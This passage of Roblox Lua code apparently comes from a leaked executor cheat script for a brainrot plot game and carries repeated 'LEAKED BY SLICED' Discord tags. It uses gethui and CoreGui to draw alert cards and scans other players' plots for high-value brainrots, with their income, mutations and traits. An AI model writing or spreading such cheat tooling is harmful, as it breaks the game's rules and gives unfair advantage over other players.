		arg.CFrame = CFrame.lookAt(position + Vector3.new(slicedn10 * 0.28, slicedn10 * 0.08, -slicedn10), position, Vector3.new(0, 1, 0))
		local humanoid = arg2:FindFirstChildWhichIsA("Humanoid") or arg2:FindFirstChildWhichIsA("AnimationController")
		humanoid = humanoid and humanoid:FindFirstChildOfClass("Animator")
		local humanoid2 = result:FindFirstChildWhichIsA("Humanoid") or result:FindFirstChildWhichIsA("AnimationController")
		local animator = humanoid2 and humanoid2:FindFirstChildOfClass("Animator")

		if humanoid and animator then  -- LEAKED BY SLICED | discord.gg/pubmethod
			local playingAnimationTracks = humanoid:GetPlayingAnimationTracks()
			playingAnimationTracks = playingAnimationTracks and playingAnimationTracks[1]

			if playingAnimationTracks and playingAnimationTracks.Animation then
				local animation = Instance.new("Animation")
				animation.AnimationId = playingAnimationTracks.Animation.AnimationId

				local ok3, result4 = pcall(function()
					return animator:LoadAnimation(animation)
				end)

				if ok3 and result4 then
					pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
						result4.Looped = true
						result4:Play(0)
						result4.TimePosition = playingAnimationTracks.TimePosition
						result4:AdjustSpeed(playingAnimationTracks.Speed)
					end)
				end
			end
		end

		return true
	end  -- LEAKED BY SLICED | discord.gg/pubmethod

	local function slicedfn40(arg)
		local sliced20 = table.find(tbl9, arg)

		if sliced20 then
			table.remove(tbl9, sliced20)
		end
	end

	local function createFrame()
		if sliced18 and sliced18.Parent then
			return sliced18
		end  -- LEAKED BY SLICED | discord.gg/pubmethod
		local parent = CoreGui

		if type(gethui) == "function" then
			local ok
			ok, parent = pcall(gethui)
			ok = ok and typeof(parent) == "Instance"
			local sliced20 = CoreGui

			if not ok then
				parent = sliced20
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local name = str .. "Gui"
		local sliced20 = parent:FindFirstChild(name)

		if sliced20 then
			pcall(function()
				sliced20:Destroy()
			end)
		end

		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = name
		screenGui.DisplayOrder = 190  -- LEAKED BY SLICED | discord.gg/pubmethod
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.Parent = parent
		local frame = Instance.new("Frame")
		frame.Name = "NotificationStack"
		frame.AnchorPoint = Vector2.new(0.5, 0)
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Position = UDim2.fromScale(0.5, 0.025)  -- LEAKED BY SLICED | discord.gg/pubmethod
		frame.Size = UDim2.new(1, -16, 0.55, 0)
		frame.Parent = screenGui
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.FillDirection = Enum.FillDirection.Vertical
		uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		uiListLayout.Padding = UDim.new(0, 5)
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Top
		uiListLayout.Parent = frame
		sliced17 = screenGui  -- LEAKED BY SLICED | discord.gg/pubmethod
		sliced18 = frame
		return frame
	end

	local function slicedfn41()
		local currentCamera = Workspace.CurrentCamera
		local x = currentCamera and currentCamera.ViewportSize.X or 1280

		if x <= 0 then
			x = 1280
		end

		return math.clamp((x - 24) / 620, 0.44, 0.72)  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	local function slicedfn42(arg, arg2, arg3)
		local secretZebra = tbl13[arg3 or "Secret Zebra"] or tbl13["Secret Zebra"]
		if type(arg) ~= "table" or not arg.Model then
			return false
		end
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		local notification = playerGui and playerGui:FindFirstChild("Notification")
		notification = notification and notification:FindFirstChild("Notification")
		notification = notification and notification:FindFirstChild("Template")  -- LEAKED BY SLICED | discord.gg/pubmethod

		if not (notification and notification:IsA("TextLabel")) then
			local sliced20 = slicedfn32()

			if sliced20 and type(sliced20.Notify) == "function" then
				local str4 = string.upper(tostring(arg.Name or "Brainrot")) .. " APPEARED!  " .. tostring(arg.ValueText or "")
				local pcall = pcall
				local notify = sliced20.Notify
				arg2 = arg2 or 6
				local top = pcall(notify, sliced20, str4, arg2, nil, "Top")

				if top then
					slicedfn36()  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				return top
			end

			return false
		end

		local sliced20 = createFrame()
		if not sliced20 then
			return false
		end

		while #tbl9 >= 4 do  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced21 = table.remove(tbl9, 1)

			if sliced21 and sliced21.Parent then
				sliced21:Destroy()
			end
		end

		local frame = Instance.new("Frame")
		frame.Name = "ChilliSpecialNotificationSlot"
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		local sliced21 = slicedfn41()  -- LEAKED BY SLICED | discord.gg/pubmethod
		frame.Size = UDim2.new(1, 0, 0, math.ceil(108 * sliced21 + 7))
		frame.ZIndex = 179
		frame.Parent = sliced20
		tbl9[#tbl9 + 1] = frame
		local frame2 = Instance.new("Frame")
		frame2.Name = "ScaledCardRoot"
		frame2.AnchorPoint = Vector2.new(0.5, 0)
		frame2.BackgroundTransparency = 1
		frame2.BorderSizePixel = 0
		frame2.Position = UDim2.fromScale(0.5, 0)  -- LEAKED BY SLICED | discord.gg/pubmethod
		local ceil = math.ceil
		frame2.Size = UDim2.fromOffset(math.ceil(620 * sliced21), ceil(108 * sliced21))
		frame2.ZIndex = 179
		frame2.Parent = frame
		local uiScale = Instance.new("UIScale")
		uiScale.Scale = sliced21 * 0.72
		uiScale.Parent = frame2
		local frame3 = Instance.new("Frame")
		frame3.Name = "ChilliSpecialNotification"
		frame3.BackgroundColor3 = secretZebra.Background  -- LEAKED BY SLICED | discord.gg/pubmethod
		frame3.BackgroundTransparency = 0.04
		frame3.BorderSizePixel = 0
		frame3.ClipsDescendants = false
		frame3.AnchorPoint = Vector2.new(0.5, 0)
		frame3.Position = UDim2.fromOffset(310, 0)
		frame3.Size = UDim2.fromOffset(620, 108)
		frame3.ZIndex = 180
		frame3.Parent = frame2
		local uiCorner = Instance.new("UICorner")
		uiCorner.CornerRadius = UDim.new(0, 17)  -- LEAKED BY SLICED | discord.gg/pubmethod
		uiCorner.Parent = frame3
		local uiGradient = Instance.new("UIGradient")
		local colorSequence = ColorSequence.new
		local tbl14 = {}
		local sliced22 = ColorSequenceKeypoint.new(0, secretZebra.Background)
		local sliced23 = ColorSequenceKeypoint.new(0.48, secretZebra.Background:Lerp(Color3.new(1, 1, 1), 0.12))
		local new = ColorSequenceKeypoint.new
		local background = secretZebra.Background
		tbl14[1] = sliced22
		tbl14[2] = sliced23  -- LEAKED BY SLICED | discord.gg/pubmethod

		do
			local values = table.pack(new(1, background))
			table.move(values, 1, values.n, 3, tbl14)
		end

		uiGradient.Color = colorSequence(tbl14)
		uiGradient.Rotation = 12
		uiGradient.Parent = frame3
		local uiStroke = Instance.new("UIStroke")
		uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke.Color = Color3.new(1, 1, 1)  -- LEAKED BY SLICED | discord.gg/pubmethod
		uiStroke.Thickness = 2.5
		uiStroke.Transparency = 0.05
		uiStroke.Parent = frame3
		local uiGradient2 = Instance.new("UIGradient")
		uiGradient2.Color = secretZebra.Colors
		uiGradient2.Parent = uiStroke
		local tween = TweenService:Create(uiGradient2, TweenInfo.new(2.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), { Rotation = 360 })
		tween:Play()
		local uiStroke2 = Instance.new("UIStroke")
		uiStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border  -- LEAKED BY SLICED | discord.gg/pubmethod
		uiStroke2.Color = secretZebra.Colors.Keypoints[1].Value
		uiStroke2.Thickness = 7
		uiStroke2.Transparency = 0.72
		uiStroke2.Parent = frame3
		local viewportFrame = Instance.new("ViewportFrame")
		viewportFrame.Name = "BrainrotPreview"
		viewportFrame.Ambient = Color3.fromRGB(190, 190, 200)
		viewportFrame.BackgroundColor3 = secretZebra.Background:Lerp(Color3.new(1, 1, 1), 0.08)
		viewportFrame.BackgroundTransparency = 0.08
		viewportFrame.BorderSizePixel = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
		viewportFrame.ClipsDescendants = true
		viewportFrame.LightColor = Color3.fromRGB(255, 255, 255)
		viewportFrame.LightDirection = Vector3.new(-0.4, -0.7, -0.6)
		viewportFrame.Position = UDim2.fromOffset(11, 9)
		viewportFrame.Size = UDim2.fromOffset(90, 90)
		viewportFrame.ZIndex = 183
		viewportFrame.Parent = frame3
		local uiCorner2 = Instance.new("UICorner")
		uiCorner2.CornerRadius = UDim.new(0, 14)
		uiCorner2.Parent = viewportFrame  -- LEAKED BY SLICED | discord.gg/pubmethod
		local uiStroke3 = Instance.new("UIStroke")
		uiStroke3.Color = Color3.new(1, 1, 1)
		uiStroke3.Thickness = 2
		uiStroke3.Transparency = 0.18
		uiStroke3.Parent = viewportFrame
		local uiGradient3 = Instance.new("UIGradient")
		uiGradient3.Color = secretZebra.Colors
		uiGradient3.Rotation = -25
		uiGradient3.Parent = uiStroke3
		local camera = Instance.new("Camera")  -- LEAKED BY SLICED | discord.gg/pubmethod
		camera.Parent = viewportFrame
		viewportFrame.CurrentCamera = camera
		slicedfn39(viewportFrame, camera, arg.Model)
		local brainrotName = slicedfn38(notification, frame3, "BrainrotName", tostring(arg.Name or "Brainrot"), UDim2.fromOffset(115, 7), UDim2.new(1, -252, 0, 34), 22)
		brainrotName.RichText = false
		brainrotName.TextColor3 = Color3.new(1, 1, 1)
		brainrotName.TextTruncate = Enum.TextTruncate.AtEnd
		brainrotName.Font = Enum.Font.GothamBlack
		brainrotName.ZIndex = 183
		local tbl15 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn43(parent, thickness)
			local uiStroke4 = Instance.new("UIStroke")
			uiStroke4.Name = "SpecialTextOutline"
			uiStroke4.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke4.Color = Color3.fromRGB(0, 0, 0)
			uiStroke4.Thickness = thickness or 1.15
			uiStroke4.Transparency = 0.18
			uiStroke4.Parent = parent
			local sliced24 = slicedfn37(parent, secretZebra)

			if sliced24 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				tbl15[#tbl15 + 1] = sliced24
			end
		end

		slicedfn43(brainrotName, 1.35)
		local frame4 = Instance.new("Frame")
		frame4.Name = "AppearedBadge"
		frame4.AnchorPoint = Vector2.new(1, 0)
		frame4.BackgroundColor3 = secretZebra.Colors.Keypoints[1].Value
		frame4.BackgroundTransparency = 0.08
		frame4.BorderSizePixel = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
		frame4.Position = UDim2.new(1, -13, 0, 10)
		frame4.Size = UDim2.fromOffset(112, 25)
		frame4.ZIndex = 183
		frame4.Parent = frame3
		local uiCorner3 = Instance.new("UICorner")
		uiCorner3.CornerRadius = UDim.new(1, 0)
		uiCorner3.Parent = frame4
		local uiGradient4 = Instance.new("UIGradient")
		uiGradient4.Color = secretZebra.Colors
		uiGradient4.Rotation = 12  -- LEAKED BY SLICED | discord.gg/pubmethod
		uiGradient4.Parent = frame4
		local uiStroke4 = Instance.new("UIStroke")
		uiStroke4.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke4.Color = Color3.new(1, 1, 1)
		uiStroke4.Thickness = 1.25
		uiStroke4.Transparency = 0.2
		uiStroke4.Parent = frame4
		local appearedText = slicedfn38(notification, frame4, "AppearedText", "APPEARED!", UDim2.fromOffset(6, 0), UDim2.new(1, -12, 1, 0), 12)
		appearedText.RichText = false
		appearedText.Font = Enum.Font.Arcade  -- LEAKED BY SLICED | discord.gg/pubmethod
		appearedText.TextColor3 = Color3.new(1, 1, 1)
		appearedText.TextXAlignment = Enum.TextXAlignment.Center
		appearedText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
		appearedText.TextStrokeTransparency = 0.25
		appearedText.ZIndex = 184
		local frame5 = Instance.new("Frame")
		frame5.Name = "GenerationBadge"
		frame5.BackgroundColor3 = Color3.fromRGB(4, 24, 10)
		frame5.BackgroundTransparency = 0.18
		frame5.BorderSizePixel = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
		frame5.Position = UDim2.fromOffset(115, 44)
		frame5.Size = UDim2.fromOffset(142, 26)
		frame5.ZIndex = 183
		frame5.Parent = frame3
		local uiCorner4 = Instance.new("UICorner")
		uiCorner4.CornerRadius = UDim.new(0, 8)
		uiCorner4.Parent = frame5
		local uiStroke5 = Instance.new("UIStroke")
		uiStroke5.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke5.Color = Color3.fromRGB(75, 255, 104)  -- LEAKED BY SLICED | discord.gg/pubmethod
		uiStroke5.Thickness = 1.2
		uiStroke5.Transparency = 0.35
		uiStroke5.Parent = frame5
		local brainrotValue = slicedfn38(notification, frame5, "BrainrotValue", tostring(arg.ValueText or ""), UDim2.fromOffset(9, 0), UDim2.new(1, -18, 1, 0), 18)
		brainrotValue.RichText = false
		brainrotValue.Font = Enum.Font.RobotoMono
		brainrotValue.TextColor3 = Color3.fromRGB(86, 255, 105)
		brainrotValue.TextStrokeColor3 = Color3.fromRGB(0, 32, 7)
		brainrotValue.TextStrokeTransparency = 0.15
		brainrotValue.ZIndex = 184  -- LEAKED BY SLICED | discord.gg/pubmethod
		local uiGradient5 = Instance.new("UIGradient")
		local colorSequence2 = ColorSequence.new
		local tbl16 = {}
		local sliced24 = ColorSequenceKeypoint.new(0, Color3.fromRGB(42, 220, 76))
		local sliced25 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(208, 255, 132))
		local new2 = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		tbl16[1] = sliced24
		tbl16[2] = sliced25

		do  -- LEAKED BY SLICED | discord.gg/pubmethod
			local values = table.pack(new2(1, color(38, 255, 105)))
			table.move(values, 1, values.n, 3, tbl16)
		end

		uiGradient5.Color = colorSequence2(tbl16)
		uiGradient5.Rotation = -8
		uiGradient5.Parent = brainrotValue
		local tween2 = TweenService:Create(uiGradient5, TweenInfo.new(1.45, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), { Rotation = 18 })
		tween2:Play()

		tbl15[#tbl15 + 1] = function()
			tween2:Cancel()  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		if arg.MutationVisible then
			local brainrotMutation = slicedfn38(notification, frame3, "BrainrotMutation", tostring(arg.MutationText or ""), UDim2.fromOffset(115, 76), UDim2.new(1, -304, 0, 22), 17)
			brainrotMutation.RichText = arg.MutationRichText == true
			brainrotMutation.TextColor3 = arg.MutationColor or Color3.fromRGB(235, 235, 240)
			brainrotMutation.TextStrokeColor3 = arg.MutationStrokeColor or Color3.fromRGB(0, 0, 0)
			brainrotMutation.TextStrokeTransparency = arg.MutationStrokeTransparency or 0.25
			brainrotMutation.TextTruncate = Enum.TextTruncate.AtEnd
			brainrotMutation.ZIndex = 183

			if arg.MutationFontFace then  -- LEAKED BY SLICED | discord.gg/pubmethod
				brainrotMutation.FontFace = arg.MutationFontFace
			end

			if arg.MutationGradientColor then
				local uiGradient6 = Instance.new("UIGradient")
				uiGradient6.Color = arg.MutationGradientColor
				uiGradient6.Rotation = arg.MutationGradientRotation or 0
				uiGradient6.Transparency = arg.MutationGradientTransparency or NumberSequence.new(0)
				uiGradient6.Parent = brainrotMutation
			else
				local uiStroke6 = Instance.new("UIStroke")  -- LEAKED BY SLICED | discord.gg/pubmethod
				uiStroke6.Name = "MutationGlow"
				uiStroke6.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
				uiStroke6.Color = arg.MutationColor or Color3.new(1, 1, 1)
				uiStroke6.Thickness = 1.1
				uiStroke6.Transparency = 0.5
				uiStroke6.Parent = brainrotMutation
			end
		end

		local frame6 = Instance.new("Frame")
		frame6.AnchorPoint = Vector2.new(1, 0)  -- LEAKED BY SLICED | discord.gg/pubmethod
		frame6.BackgroundTransparency = 1
		frame6.Position = UDim2.new(1, -13, 0, 74)
		frame6.Size = UDim2.fromOffset(174, 28)
		frame6.ZIndex = 183
		frame6.Parent = frame3
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.FillDirection = Enum.FillDirection.Horizontal
		uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
		uiListLayout.Padding = UDim.new(0, 3)
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder  -- LEAKED BY SLICED | discord.gg/pubmethod
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
		uiListLayout.Parent = frame6
		local ipairs = ipairs
		local traitImages = arg.TraitImages or {}

		for k, traitImage in ipairs(traitImages) do
			if not (k > 6) then
				local frame7 = Instance.new("Frame")
				frame7.Name = "TraitBadge"
				frame7.BackgroundColor3 = secretZebra.Background:Lerp(Color3.new(1, 1, 1), 0.16)
				frame7.BackgroundTransparency = 0.12  -- LEAKED BY SLICED | discord.gg/pubmethod
				frame7.BorderSizePixel = 0
				frame7.LayoutOrder = k
				frame7.Size = UDim2.fromOffset(26, 26)
				frame7.ZIndex = 183
				frame7.Parent = frame6
				local uiCorner5 = Instance.new("UICorner")
				uiCorner5.CornerRadius = UDim.new(0, 7)
				uiCorner5.Parent = frame7
				local uiStroke6 = Instance.new("UIStroke")
				uiStroke6.ApplyStrokeMode = Enum.ApplyStrokeMode.Border  -- LEAKED BY SLICED | discord.gg/pubmethod
				uiStroke6.Color = secretZebra.Colors.Keypoints[1].Value
				uiStroke6.Thickness = 1
				uiStroke6.Transparency = 0.35
				uiStroke6.Parent = frame7
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.BackgroundTransparency = 1
				imageLabel.Image = traitImage
				imageLabel.Position = UDim2.fromOffset(2, 2)
				imageLabel.Size = UDim2.fromOffset(22, 22)
				imageLabel.ZIndex = 184  -- LEAKED BY SLICED | discord.gg/pubmethod
				imageLabel.Parent = frame7
				continue
			end

			break
		end

		local frame7 = Instance.new("Frame")
		frame7.Name = "ShineClip"
		frame7.BackgroundTransparency = 1
		frame7.BorderSizePixel = 0
		frame7.ClipsDescendants = true  -- LEAKED BY SLICED | discord.gg/pubmethod
		frame7.Size = UDim2.fromScale(1, 1)
		frame7.ZIndex = 182
		frame7.Parent = frame3
		local uiCorner5 = Instance.new("UICorner")
		uiCorner5.CornerRadius = UDim.new(0, 17)
		uiCorner5.Parent = frame7
		local frame8 = Instance.new("Frame")
		frame8.Name = "Shine"
		frame8.BackgroundColor3 = Color3.new(1, 1, 1)
		frame8.BackgroundTransparency = 0.78  -- LEAKED BY SLICED | discord.gg/pubmethod
		frame8.BorderSizePixel = 0
		frame8.Position = UDim2.fromScale(-0.25, 0)
		frame8.Rotation = 18
		frame8.Size = UDim2.fromScale(0.13, 1.35)
		frame8.ZIndex = 182
		frame8.Parent = frame7
		local uiGradient6 = Instance.new("UIGradient")
		local numberSequence = NumberSequence.new
		local tbl17 = {}
		local sliced27 = NumberSequenceKeypoint.new(0, 1)  -- LEAKED BY SLICED | discord.gg/pubmethod
		local sliced28 = NumberSequenceKeypoint.new(0.5, 0)
		local new3 = NumberSequenceKeypoint.new
		tbl17[1] = sliced27
		tbl17[2] = sliced28

		do
			local values = table.pack(new3(1, 1))
			table.move(values, 1, values.n, 3, tbl17)
		end

		uiGradient6.Transparency = numberSequence(tbl17)
		uiGradient6.Parent = frame8  -- LEAKED BY SLICED | discord.gg/pubmethod
		TweenService:Create(uiScale, TweenInfo.new(0.42, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = sliced21 }):Play()
		TweenService:Create(frame8, TweenInfo.new(1.25, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), { Position = UDim2.fromScale(1.18, -0.12) }):Play()
		slicedfn36()
		local slicedn10 = tonumber(arg2) or 6

		pcall(function()
			game:GetService("Debris"):AddItem(frame, slicedn10 + 1.5)
		end)

		local flag7 = false

		local function slicedfn44()
			if flag7 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end
			flag7 = true

			for i_ = #tbl15, 1, -1 do
				pcall(tbl15[i_])
				tbl15[i_] = nil
			end

			pcall(function()
				tween:Cancel()
			end)  -- LEAKED BY SLICED | discord.gg/pubmethod

			slicedfn40(frame)

			if frame.Parent then
				pcall(function()
					frame:Destroy()
				end)
			end
		end

		task.delay(slicedn10, function()
			local sliced29 = flag7
			local flag8  -- LEAKED BY SLICED | discord.gg/pubmethod

			if flag7 then
				flag8 = sliced29
			else
				flag8 = not frame3.Parent
			end

			if flag8 then
				slicedfn44()
				return
			end

			pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				tween:Cancel()
				local tbl18 = { Scale = sliced21 * 0.78 }
				TweenService:Create(uiScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), tbl18):Play()

				for _, descendant in ipairs(frame3:GetDescendants()) do
					if descendant:IsA("TextLabel") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { TextTransparency = 1, BackgroundTransparency = 1 }):Play()
					elseif descendant:IsA("UIStroke") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { Transparency = 1 }):Play()
					elseif descendant:IsA("ImageLabel") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { ImageTransparency = 1 }):Play()  -- LEAKED BY SLICED | discord.gg/pubmethod
					elseif descendant:IsA("ViewportFrame") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { BackgroundTransparency = 1, ImageTransparency = 1 }):Play()
					elseif descendant:IsA("Frame") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { BackgroundTransparency = 1 }):Play()
					end
				end

				TweenService:Create(frame3, TweenInfo.new(0.28), { BackgroundTransparency = 1 }):Play()
			end)

			task.delay(0.34, slicedfn44)
		end)  -- LEAKED BY SLICED | discord.gg/pubmethod

		task.delay(slicedn10 + 1, slicedfn44)
		return true
	end

	local function slicedfn43(arg)
		local match, sliced20 = tostring(arg or ""):gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")
		local num = tonumber(match)
		if not num then
			return nil
		end
		return num * (({ K = 1000, M = 1000000, B = 1e9, T = 1e12 })[string.upper(sliced20)] or 1)  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	local function slicedfn44(arg)
		if arg >= 1e12 then
			return string.format("$%.2fT/s", arg / 1e12)
		end

		if arg >= 1e9 then
			return string.format("$%.2fB/s", arg / 1e9)
		end

		if arg >= 1000000 then
			return string.format("$%.2fM/s", arg / 1000000)  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		if arg >= 1000 then
			return string.format("$%.1fK/s", arg / 1000)
		end
		return string.format("$%d/s", math.floor(arg))
	end

	local function slicedfn45(arg)
		return arg:FindFirstChild("RootPart") or arg.PrimaryPart or arg:FindFirstChildWhichIsA("BasePart")
	end

	local function slicedfn46()  -- LEAKED BY SLICED | discord.gg/pubmethod
		local tbl14 = {}
		local debris = Workspace:FindFirstChild("Debris")
		if not debris then
			return tbl14
		end

		for _, child in ipairs(debris:GetChildren()) do
			if child:IsA("BasePart") and child.Name == "FastOverheadTemplate" then
				local animalOverhead = child:FindFirstChild("AnimalOverhead")
				local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")
				local generation = animalOverhead and animalOverhead:FindFirstChild("Generation")  -- LEAKED BY SLICED | discord.gg/pubmethod

				if displayName and displayName:IsA("TextLabel") and generation and generation:IsA("TextLabel") then
					local str4 = tostring(displayName.Text or "")
					tbl14[str4] = tbl14[str4] or {}
					tbl14[str4][#tbl14[str4] + 1] = { Position = child.Position, Value = slicedfn43(generation.Text), Overhead = animalOverhead }
				end
			end
		end

		return tbl14
	end

	local function slicedfn47(arg, arg2, arg3)  -- LEAKED BY SLICED | discord.gg/pubmethod
		local sliced20, sliced21, sliced22 = ipairs(arg3[arg] or {})
		local slicedn10 = 14
		local sliced23 = nil

		for _, sliced24 in sliced20, sliced21, sliced22 do
			local magnitude = (sliced24.Position - arg2).Magnitude

			if magnitude < slicedn10 then
				slicedn10 = magnitude
				sliced23 = sliced24
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		return sliced23
	end

	local function slicedfn48(arg, arg2)
		local sliced20 = tbl10[arg.Name]
		local slicedn10 = type(sliced20) == "table" and tonumber(sliced20.Generation) or 0
		if slicedn10 <= 0 then
			arg2 = arg2 and arg2.Value
			return arg2 or 0
		end
		local attribute = arg:GetAttribute("Mutation") or arg:GetAttribute("__mutation")  -- LEAKED BY SLICED | discord.gg/pubmethod
		local mutation = arg2 and arg2.Overhead:FindFirstChild("Mutation")

		if mutation and mutation:IsA("TextLabel") and mutation.Visible and mutation.Text ~= "" then
			attribute = mutation.Text
		end

		attribute = attribute and tbl11[tostring(attribute)]
		local slicedn11 = 1

		if type(attribute) == "table" then
			slicedn11 = 1 + (tonumber(attribute.Modifier) or 0)
		end

		local flag7 = false  -- LEAKED BY SLICED | discord.gg/pubmethod

		for _, child in ipairs(arg:GetChildren()) do
			local match = child.Name:match("^_Trait%.(.+)$")
			local sliced21 = match and (tbl12[match] or tbl12[match:gsub("_", " ")])

			if type(sliced21) == "table" then
				if match == "Sleepy" or sliced21.Name == "Sleepy" then
					flag7 = true
				else
					slicedn11 += tonumber(sliced21.MultiplierModifier) or 0
				end
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local sliced21 = math.round(slicedn10 * slicedn11 * (flag7 and 0.5 or 1))
		arg2 = arg2 and arg2.Value
		if arg2 and arg2 > 0 then
			return arg2
		end
		return sliced21
	end

	local function slicedfn49()
		local tbl14 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod
		local plots = Workspace:FindFirstChild("Plots")
		if not plots then
			return tbl14, 0
		end
		local sliced20 = slicedfn46()
		local slicedn10 = 0

		for _, child in ipairs(plots:GetChildren()) do
			for _, child2 in ipairs(child:GetChildren()) do
				if child2:IsA("Model") and tbl10[child2.Name] then
					local sliced21 = slicedfn45(child2)  -- LEAKED BY SLICED | discord.gg/pubmethod

					if sliced21 then
						local overhead = slicedfn47(child2.Name, sliced21.Position, sliced20)
						local sliced22 = slicedfn48(child2, overhead)

						if sliced22 > 0 then
							local sliced23 = tbl10[child2.Name]
							overhead = overhead and overhead.Overhead
							local mutation = overhead and overhead:FindFirstChild("Mutation")
							local visible = mutation and mutation:IsA("TextLabel") and mutation.Visible

							if visible then
								visible = tostring(mutation.Text or "") ~= ""  -- LEAKED BY SLICED | discord.gg/pubmethod
							end

							if visible then
								visible = string.lower(tostring(mutation.Text or "")) ~= "normal"
							end

							local text = nil
							local flag7 = false
							local textColor3 = nil
							local flag8 = false
							local fontFace = nil
							local textStrokeColor3 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
							local textStrokeTransparency = nil
							local color = nil
							local rotation = nil
							local transparency = nil

							if visible then
								text = mutation.Text
								textColor3 = mutation.TextColor3
								flag8 = mutation.RichText
								fontFace = mutation.FontFace
								textStrokeColor3 = mutation.TextStrokeColor3  -- LEAKED BY SLICED | discord.gg/pubmethod
								textStrokeTransparency = mutation.TextStrokeTransparency
								local uiGradient = mutation:FindFirstChildWhichIsA("UIGradient")
								flag7 = true
								color = nil
								rotation = nil
								transparency = nil

								if uiGradient then
									color = uiGradient.Color
									rotation = uiGradient.Rotation
									transparency = uiGradient.Transparency  -- LEAKED BY SLICED | discord.gg/pubmethod
								end
							end

							local tbl15 = {}
							local traits = overhead and overhead:FindFirstChild("Traits")

							if traits then
								for _, child3 in ipairs(traits:GetChildren()) do
									if child3:IsA("ImageLabel") and child3.Visible and child3.Image ~= "" and #tbl15 < 6 then
										tbl15[#tbl15 + 1] = child3.Image
									end
								end  -- LEAKED BY SLICED | discord.gg/pubmethod
							end

							local rarity = type(sliced23) == "table" and (sliced23.Rarity or sliced23.Tier or sliced23.Rank) or nil

							tbl14[#tbl14 + 1] = {
								Model = child2,
								Name = child2.Name,
								Value = sliced22,
								ValueText = slicedfn44(sliced22),
								Rarity = rarity and tostring(rarity) or "",
								MutationVisible = flag7,
								MutationText = text and tostring(text) or nil,  -- LEAKED BY SLICED | discord.gg/pubmethod
								MutationColor = textColor3,
								MutationRichText = flag8,
								MutationFontFace = fontFace,
								MutationStrokeColor = textStrokeColor3,
								MutationStrokeTransparency = textStrokeTransparency,
								MutationGradientColor = color,
								MutationGradientRotation = rotation,
								MutationGradientTransparency = transparency,
								TraitImages = tbl15,
							}  -- LEAKED BY SLICED | discord.gg/pubmethod

							if slicedn10 < sliced22 then
								slicedn10 = sliced22
							end
						end
					end
				end
			end
		end

		return tbl14, slicedn10
	end  -- LEAKED BY SLICED | discord.gg/pubmethod

	local function slicedfn50(arg, arg2)
		slicedfn42(arg, 7, arg2 or "Secret Zebra")
	end

	local function slicedfn51()
		table.clear(obj2)
		local sliced20, sliced21 = slicedfn49()

		for _, sliced22 in ipairs(sliced20) do
			obj2[sliced22.Model] = { FirstSeen = -math.huge, Value = sliced22.Value }
		end

		slicedn8 = sliced21  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	local function slicedfn52()
		local now = os.clock()
		local sliced20, sliced21 = slicedfn49()
		local tbl14 = {}
		local slicedn10 = 0

		for _, sliced22 in ipairs(sliced20) do
			local sliced23 = obj2[sliced22.Model]
			local isNew = sliced23 == nil
			local flag7 = sliced23 and now - sliced23.FirstSeen <= slicedn6 and sliced22.Value > sliced23.Value  -- LEAKED BY SLICED | discord.gg/pubmethod
			sliced22.IsNew = isNew
			sliced22.IsLateValue = flag7 == true

			if isNew then
				obj2[sliced22.Model] = { FirstSeen = now, Value = sliced22.Value }
			elseif sliced23.Value < sliced22.Value then
				sliced23.Value = sliced22.Value
			end

			if not isNew and not flag7 and sliced22.Value > slicedn10 then
				slicedn10 = sliced22.Value
